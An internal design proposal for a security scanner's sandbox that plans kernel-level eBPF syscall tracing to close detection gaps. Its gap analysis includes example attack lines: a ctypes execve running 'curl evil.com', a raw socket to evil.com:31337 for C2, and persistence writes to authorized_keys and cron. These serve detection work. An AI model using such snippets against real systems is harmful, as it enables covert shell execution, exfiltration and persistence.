# Sandbox observability upgrade — production-grade plan

**Status:** proposal. **Owner:** TBD. **Estimated effort:** 3-5 days
engineering across 3 phases, $0 ongoing cost.

The Phase 3 Stage 1 behavioral probe is the strongest hypothesis-
generation signal in Argus today, and it's also the most leverage-rich
place to invest. This doc audits what we currently observe at runtime,
identifies the concrete signal gaps that produce false-negative
verdicts, and proposes a 3-phase upgrade path centred on eBPF kernel
tracing.

---

## V0 — what we observe today

Single source-of-truth for each language:

### Python — `sys.addaudithook`

`dast/behavioral_probe.py:_build_python_behavioral_probe_script` installs
an audit hook that fires on these CPython events:

| Audit event | Surfaces as | Coverage |
|---|---|---|
| `exec` | `calls_exec` | Most calls to `exec()` — silently skips some `eval()` paths in CPython 3.11+ (known gap, compensated by static AST scan) |
| `compile` | `calls_compile` | All `compile()` builtin calls |
| `subprocess.Popen` | `calls_subprocess` | `subprocess.run/Popen/call`, but NOT raw `os.execv*`, NOT `os.system` |
| `pickle.find_class` | `calls_pickle_loads` | `pickle.load`/`loads` only; misses custom unpicklers |
| `marshal.loads` | `calls_marshal_loads` | Direct hits only |
| `import` | `calls_dynamic_import` | All imports (filtered to non-stdlib) |
| `open` | `opens_files` | `open()` builtin, `pathlib.Path.open` — NOT raw `os.open()` |
| `socket.connect` | `network_attempts` | `socket.connect()` only; NOT raw `connect()` syscall via ctypes |

**Bypass surface**: ctypes-loaded libc, raw syscalls via `os.syscall` /
`os.read`, mmap'd executable memory.

### JavaScript — monkey-patched built-ins (v1.8)

`dast/behavioral_probe.py:_build_javascript_behavioral_probe_script`
replaces functions on the Node built-in modules BEFORE the target's
dynamic `import()` runs. Wraps:

| Wrapped | Signal |
|---|---|
| `Module.prototype.require` | require-graph, `calls_dynamic_import` |
| `global.eval`, `Function` ctor | `calls_eval` |
| `vm.runInNewContext` / `runInContext` / `runInThisContext` / `compileFunction` | `calls_exec` |
| `child_process.{exec, execSync, spawn, spawnSync, execFile, execFileSync, fork}` | `calls_subprocess` |
| `fs.{readFile*, writeFile*, open, createReadStream, createWriteStream, appendFile*}` | `opens_files` |
| `http.{request,get}`, `https.{request,get}`, `net.{connect,createConnection}` | `network_attempts` |

**Bypass surface**: a clever target can save references to built-ins
**before** our patches install (e.g., `const origExec = require.cache
['child_process'].exports.exec;`); raw socket via `process.binding`
internal APIs; native-addon (`.node`) calls.

### Network — DNS hijack + 3-port capture server

`dast/sandbox/firecracker/dast-capture-server.py` listens on
`127.0.0.1:{80,443,53}`. `dast-init.sh` rewrites `/etc/resolv.conf`
to point at `127.0.0.1`, so every `getaddrinfo()` returns `127.0.0.1`.
All outbound HTTP/HTTPS/DNS lands at the capture server and gets
logged as `/tmp/captured.jsonl`.

| What we catch | What we miss |
|---|---|
| HTTP request line + headers + 8 KB body | Raw TCP to non-80/443 ports |
| TLS ClientHello SNI hostname (no MITM) | UDP traffic outside :53 |
| DNS query name | ICMP / raw IP packets |
| | Connections that go through `socket()` + `connect()` directly to an IP |

### Filesystem — `/workspace` diff + `/tmp` baseline

`entrypoint.py:307` walks `/workspace` before + after each command and
emits `file_writes_observed` for any new/modified file. `/tmp` is
baselined separately in the probe harnesses (per-callable).

| Catches | Misses |
|---|---|
| New files in `/workspace`, `/tmp` | Reads (no read-tracking) |
| File size changes | Writes outside `/workspace`+`/tmp` (`/root`, `/home`, `/var/log`, `/etc`) |
| | Modify-then-restore (timestamp-based diff wouldn't catch it; size-based only catches size deltas) |
| | Write contents (just paths + sizes) |

### Process tree — orchestrator-recorded spawns

Every `PLAN_COMMANDS` step emits `process_spawn` and `process_exit`
events. Subprocess monkey-patches see what the target spawned via
`subprocess.Popen` / `child_process.exec` etc. — but only the
*immediate* child.

| Catches | Misses |
|---|---|
| Plan-level command graph | Grandchildren and beyond |
| Subprocess args (via wrap) | Args after target uses `posix_spawn`, `execve` directly |
| Exit code + stdout/stderr (capped 8KB) | Stdout > 8KB (truncated; mitigated via file-channel for harnesses) |

### Static complements

Both Python AST and JS regex scans complement the runtime observations
with `calls_*_static` flags — defends against targets that hook their
own intercepts before our patches install. Per-callable for Python,
file-level for JS (v1 limitation).

---

## Concrete signal gaps that hurt verdicts

This is where the cost-benefit case lives. Each gap below has produced
a false negative in real scans (or is plausibly doing so given the
attack surface):

### Gap 1: Raw-syscall bypass

A target that does:

```python
import ctypes
libc = ctypes.CDLL("libc.so.6")
libc.execve(b"/bin/sh", (ctypes.c_char_p * 2)(b"-c", b"curl evil.com"), None)
```

…executes a shell without firing `subprocess.Popen` audit, without
firing `os` audit events, without any wrap we have. Our behavioral
profile reports `calls_subprocess=False`. Sonnet then doesn't nominate
command_injection hypotheses for this callable. **False negative.**

Same shape in JS: `require('child_process')` after saving a reference
to a bypassed `require`; or native `.node` modules that call `execve`
directly.

### Gap 2: Wide-filesystem writes

A target writes to `/root/.ssh/authorized_keys`, `/etc/cron.d/`,
or `/var/log/wtmp`. None of these are in `/workspace` or `/tmp`. Our
`file_writes_observed` never fires. Sonnet sees `opens_files: []` and
concludes the function doesn't touch the filesystem. **False
negative** on persistence-mechanism CWEs (CWE-732 incorrect
permission, CWE-552 sensitive-data exposure via files).

### Gap 3: Non-standard ports + raw sockets

A target opens a raw TCP connection to `evil.com:31337` for C2:

```python
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("evil.com", 31337))
```

`socket.connect` fires the Python audit hook → captured. But:
- The capture server **isn't listening on 31337**, so the body of the
  exchange is lost — we know there was an attempt, not what was sent.
- A raw `connect()` syscall (via ctypes / native addon) bypasses the
  audit hook entirely.
- UDP exfil (DNS data exfil patterns, NTP-amplification setup) only
  caught if it lands on :53.

Currently surfaces as `network_attempts: ["evil.com:31337"]` with no
body content. Sonnet's hypothesis nomination is weaker without the
payload signal.

### Gap 4: Memory-resident execution

`mprotect(addr, len, PROT_EXEC|PROT_READ|PROT_WRITE)` followed by
jumping to that memory. Standard shellcode injection pattern. Zero
audit events fire. We never see it.

Less common in targets we scan today (mostly Python/JS), but real for
binary-loader exploits (CWE-94 against compiled extensions, ML
detonation paths with `.so` deserialization).

### Gap 5: Process tree opacity

If the target does `subprocess.run("sh", input="curl evil.com")`,
we see the `sh` spawn but NOT the `curl`. Two-step exfil chains via
indirect spawning aren't fully attributed. Phase B+ chains partially
addresses this at the analysis level, but the underlying observation
is blind to grandchildren.

### Gap 6: Capability + permission deltas

`setuid()`, `capset()`, `unshare()` for namespace manipulation,
`prctl()` for op gating — none observable. Container/sandbox-escape
attempts go unflagged. (Argus targets aren't usually trying to escape
a real container, but the same primitives appear in containment-aware
malware testing for escape, which is a signal we should surface.)

---

## What eBPF actually buys us

**eBPF** = sandboxed bytecode programs running in the Linux kernel,
attached to kprobes (kernel function entry/exit), uprobes (userspace
function entry), tracepoints (stable kernel events), and packet
filters. Verified safe before load. Low overhead (kernel-space
execution, ring-buffer event passing).

For our use case, the relevant kernel hooks:

| Hook point | What we'd see | Closes gap |
|---|---|---|
| `tracepoint:syscalls:sys_enter_execve` | Every `execve()` regardless of how invoked — `subprocess.Popen`, `os.execv`, raw `ctypes.libc.execve` | Gap 1, Gap 5 |
| `tracepoint:syscalls:sys_enter_openat` | Every file open with full path — anywhere in filesystem | Gap 2 |
| `tracepoint:syscalls:sys_enter_connect` | Every `connect()` syscall — TCP/UDP/UNIX, any port, any address | Gap 3 |
| `tracepoint:syscalls:sys_enter_mmap` / `mprotect` | Memory protection changes; flagged when `PROT_EXEC` requested | Gap 4 |
| `tracepoint:syscalls:sys_enter_clone` / `fork` / `vfork` | Process tree — every child spawn with parent PID | Gap 5 |
| `tracepoint:syscalls:sys_enter_setuid` / `capset` / `unshare` / `prctl` | Privilege / namespace operations | Gap 6 |
| `kprobe:tcp_v4_connect` / `tcp_v6_connect` | TCP-level connect with full sockaddr — pre-DNS, no hostname needed | Gap 3 (better than syscall hook for some races) |

**What's special vs. our current stack**:

1. **It's in the kernel, not in user space.** Target code can't unhook
   it. The bypass surface of monkey-patching evaporates.
2. **It sees everything in the process tree.** Grandchildren, ad
   infinitum. Per-PID + parent-PID + cgroup attribution.
3. **It's deterministic + sampled-controllable.** Ring buffer with
   defined size; sampling rate tunable; events stamped with monotonic
   clock.
4. **It's the same instrumentation Falco / Tracee / Tetragon use** —
   production security telemetry stacks at companies like Datadog,
   Sysdig, Isovalent.

---

## Feasibility on our stack

Two non-trivial questions:

### Q1. Does Fly's Firecracker kernel support eBPF?

Fly's stock kernel is built from upstream with `CONFIG_BPF=y`,
`CONFIG_BPF_SYSCALL=y`, `CONFIG_KPROBE_EVENTS=y`,
`CONFIG_BPF_EVENTS=y` — observed empirically in their public guidance
on running eBPF tools in Fly machines. **Tracepoints** (the ones we
need for syscall observability) require `CONFIG_TRACEPOINTS=y` —
universal in production kernels.

**Validation step in Phase 1 of the plan**: spin a Fly machine,
attempt to load a trivial bpftrace script, observe behaviour.

### Q2. Does the runner user have CAP_BPF?

Today, dast-init.sh runs as root for the iptables / DNS-hijack setup,
then drops to `runner` (uid 1000) before exec'ing the entrypoint.
**Plan execution runs unprivileged.** Two options:

1. **Run bpftrace as a sidecar.** Spawn `bpftrace -o /tmp/syscalls.
   jsonl <script>` as root in dast-init.sh BEFORE dropping to
   runner. Stream events to a known path. Entrypoint reads at
   end-of-run, same way it drains `captured.jsonl` today. **Net
   effect**: runner stays unprivileged, bpftrace observes the
   runner-uid process from kernel space.

2. **Grant CAP_BPF to runner.** Cleaner-feeling but more privilege.
   Requires kernel ≥ 5.8, `cap_bpf` setcap-able on a wrapper binary.
   More moving parts; defer.

**Option 1 wins.** Bpftrace as a root sidecar matches how Falco /
Tracee run in production — as a daemon, observing other processes
externally.

### Q3. Overhead?

bpftrace adds ~5-15% overhead on busy syscall paths. For our targets
(short-lived probe harnesses, max 60s wall clock), this means
behavioural probe budget moves from "60s for the harness" to "60s
including bpftrace bookkeeping" — order ~0.5-1s extra per probe.
Acceptable.

Per-machine memory: bpftrace's ring buffer is configurable. 1 MB is
plenty for a 60s window emitting kilobytes of structured events.

### Q4. Stream volume?

A busy target can fire 10,000s of syscalls/sec. We don't want to
record every one. Two filtering strategies:

1. **Whitelist syscalls of interest** (`execve`, `openat`, `connect`,
   `mmap` with `PROT_EXEC`, etc.). bpftrace's `if` clauses run in
   kernel space; events that fail the filter never leave the ring
   buffer. Cuts volume 100-1000x.
2. **Sample by PID**: only emit events tagged with our target's PID
   (the `runner` invocation, ID known to dast-init).

Both apply.

---

## Proposed 3-phase rollout

### Phase 1 — quick wins via existing tools (~1 day)

Before touching eBPF, close gaps via tools already in the lean image:

**1.1 — Wider filesystem diff** (~2 hours)
- `entrypoint.py` `_diff_workspace_files()` → walk additional paths:
  `/root`, `/home`, `/etc`, `/var/log`. Diff before+after. New
  `file_writes_outside_workspace` event.
- **Closes Gap 2** with no kernel work.

**1.2 — strace shim for high-stakes plans** (~3 hours)
- For plans where `synthesis_context.kind == "stateful_sequence"` or
  Phase 3 Stage 2 — wrap the runner command in `strace -ff -e
  trace=network,file,process -o /tmp/strace.txt -p $$`. Per-syscall
  log to a file. Parse at end-of-run.
- ~30% overhead on busy targets; opt-in. **Closes Gap 1 partially,
  Gap 5 fully.**

**1.3 — Raw-TCP capture server, all ports** (~3 hours)
- Replace per-port listeners in `dast-capture-server.py` with a
  single `127.0.0.1:0` accept loop using transparent proxy iptables
  rule (already have CAP_NET_ADMIN at root). Drain all TCP to the
  capture server, log peer + body. **Closes Gap 3 partial.**

Phase 1 alone is meaningfully better and ships cheap.

### Phase 2 — eBPF via bpftrace (~2-3 days)

**2.1 — Bake bpftrace into lean image** (~half day)
- Apt-install `bpftrace` in `Dockerfile.lean` (~10 MB).
- Verify on a Fly machine boot: `bpftrace -e 'tracepoint:syscalls:
  sys_enter_execve { printf("%s\n", comm); }'` — should produce
  events when anything runs `execve` in the VM.
- Image rebuild as v4.

**2.2 — Per-plan bpftrace script generation** (~1 day)
- New module `dast/sandbox/observability.py`:
  - `build_bpftrace_script(*, watched_pid: int, output_path: str) -> str`
  - Emits a bpftrace script that:
    1. Tracks PID + descendants (via `clone`/`fork` tree-walking)
    2. Hooks `execve` / `openat` / `connect` / `mmap` (with
       `PROT_EXEC` filter) / `setuid` / `capset` / `unshare`
    3. Filters to our PID tree
    4. Emits JSON-per-event to `/tmp/syscalls.jsonl`

- `dast-init.sh` spawns it before `runuser`:
  ```bash
  bpftrace /usr/local/lib/argus-bpftrace.bt > /tmp/syscalls.jsonl &
  BPFTRACE_PID=$!
  echo "$BPFTRACE_PID" >/tmp/bpftrace.pid
  ```
- Image rebuild as v4 (already at v3 with P2a v0.3 + JS DAST).

**2.3 — Trace parser + behavioral_profile schema extension** (~1 day)
- New module `dast/syscall_parser.py`:
  - `parse_syscall_trace(jsonl_path: Path) -> SyscallObservations`
  - Aggregates per-PID syscall summary, maps to existing
    `CallableObservation` flag set + new flags:
    - `mprotect_exec_count` (Gap 4)
    - `setuid_attempts` (Gap 6)
    - `wide_filesystem_writes` (Gap 2)
    - `non_localhost_connects` (Gap 3, with full sockaddr)
- `entrypoint.py` drains `/tmp/syscalls.jsonl` at end-of-run, emits
  new `syscall_observations` event(s).
- `dast/orchestrator.py:_run_phase_3_behavioral_probe` merges
  syscall observations into the per-callable
  `CallableObservation` dataclass.
- Extend `BehavioralProfile` schema (parallel to existing
  `calls_*` fields).

**2.4 — Unit tests + smoke** (~half day)
- Generated bpftrace script syntax check (`bpftrace --dry-run`).
- Trace parser against fixture JSONL.
- Smoke: real Argus scan against `argus_jsdast_smoketest.js`,
  verify `BehavioralProfile.syscall_*` fields populated, see new
  signal flow into Stage 2 hypothesis design.

### Phase 3 — Stage 2 prompt integration (~half day)

Until the model knows what to do with the new signals, they're
useless. Update `dast/prompts.py:build_phase_3_stage_2_prompt` to
surface the new behavioral fields and instruct on hypothesis
classes:

- `mprotect_exec_count > 0` → nominate **memory-corruption** /
  **JIT-shellcode** hypotheses
- `wide_filesystem_writes` includes `/etc/cron*` or `/root/.ssh`
  → nominate **persistence-mechanism** hypothesis (CWE-552)
- `non_localhost_connects` with non-standard port → nominate
  **C2-channel** hypothesis (CWE-918 SSRF variant or covert exfil)
- `setuid_attempts > 0` → nominate **privilege-escalation**
  hypothesis (CWE-269)

Bench the prompt change with a small synthetic corpus before
flipping default-on for Stage 2.

---

## Cost / benefit

**Costs (one-time)**:
- ~3-5 days engineering for Phases 1+2+3
- ~10 MB image bloat (bpftrace + deps)
- ~half-day per real bug discovered while landing Phase 2

**Costs (per scan, ongoing)**:
- ~0.5-1s extra wall-clock per Stage 1 probe (bpftrace overhead)
- ~$0.00 — no extra API calls; signals enrich existing prompts
- ~50-200 KB extra `/tmp/syscalls.jsonl` per probe (well under Fly
  log budgets)

**Benefits**:
1. **Closes 6 named bypass paths** that we know malicious code can
   take today
2. **Higher Stage 2 hypothesis quality** → more CONFIRMED findings →
   better verdict-exact lift over single-call Opus baseline
3. **Production-grade observability matching Falco / Tracee / Tetragon
   stack** — credibility signal if/when we publish or share
4. **Reduces dependence on language-specific monkey-patches** —
   future language coverage (Go, Java) gets observability "for free"
   from the kernel layer
5. **The hypothesis-generation use case is the right one** — eBPF is
   how Sonnet sees what really happened, not what the harness pretends
   happened

**Risk / unknowns**:
- Fly Firecracker kernel BPF config (high confidence supported, but
  need to validate empirically in Phase 2.1)
- bpftrace startup latency on cold-boot machines (likely ~100-300 ms;
  acceptable but verify)
- Stage 2 prompt-tuning effort — new signals need new framing;
  measure verdict-exact lift before declaring win

---

## Open questions

1. **Capability scope**: option 1 (bpftrace as root sidecar) feels
   right, but does it interact badly with our existing privilege-drop
   pattern? Need to verify the sidecar process survives the runuser
   exec.
2. **Stream ordering**: bpftrace ring-buffer events vs. harness's own
   structured markers — both emit to file paths. Parser needs to
   reconcile timeline for "the eval() call at T+125ms also did an
   openat() at T+126ms" attribution.
3. **Multi-language coverage**: bpftrace observes the kernel, so JS,
   Python, Java, Go targets all benefit identically. Plan as written
   doesn't make this explicit — should we lean into it as the
   "language-agnostic observability layer"?
4. **What about runtime probe chains?** Stage 1 is the natural fit
   (long-lived observation across many callable invocations). Should
   Phase B+ chains also enable bpftrace? Marginal benefit; defer.

---

## Comparison to other approaches considered

| Approach | Pros | Cons | Decision |
|---|---|---|---|
| **eBPF (this plan)** | Kernel-level, no bypass, language-agnostic, production-proven | Requires bpftrace install, capability boundary work | **Adopt** |
| Ptrace-based syscall tracer (`strace`-shaped) | Battle-tested, simple integration | ~30% overhead, single-process tracing, doesn't survive forks easily without `-f`, target can detect | Use selectively in Phase 1 only |
| Userspace LD_PRELOAD shim | Easy to deploy, no kernel deps | Target can `dlsym(RTLD_NEXT)` and bypass; doesn't survive `execve()` | Rejected — same bypass class as monkey-patches |
| Run target in nested VM with custom kernel | Total isolation + observability | Massive infra cost, kills our latency budget | Rejected |
| Falco / Tetragon prebuilt | Production-grade stack | Designed for cluster security, not per-process analysis; heavier than we need | Use as reference, don't depend on |

---

## TL;DR

We monitor today via language-specific instrumentation (Python audit
hooks, JS monkey patches), a 3-port DNS-hijack network capture
server, and a workspace filesystem diff. Each has named bypass paths
that produce real false negatives in Stage 2 hypothesis nomination.

eBPF — running bpftrace as a root sidecar in the sandbox — closes 6
of the 6 named gaps at ~5% runtime cost, 10 MB image cost, ~0 API
cost. The signal goes into the existing `BehavioralProfile` schema
and feeds Stage 2's adversarial reasoning loop directly. Rollout in 3
phases over ~3-5 engineering days. Production-proven observability
pattern (Falco / Tracee / Tetragon).

Recommended next step: Phase 1 ships standalone (no kernel work) and
validates the gap-closing thesis cheap. Phase 2 follows once Phase 1
shows verdict-exact lift over the baseline.
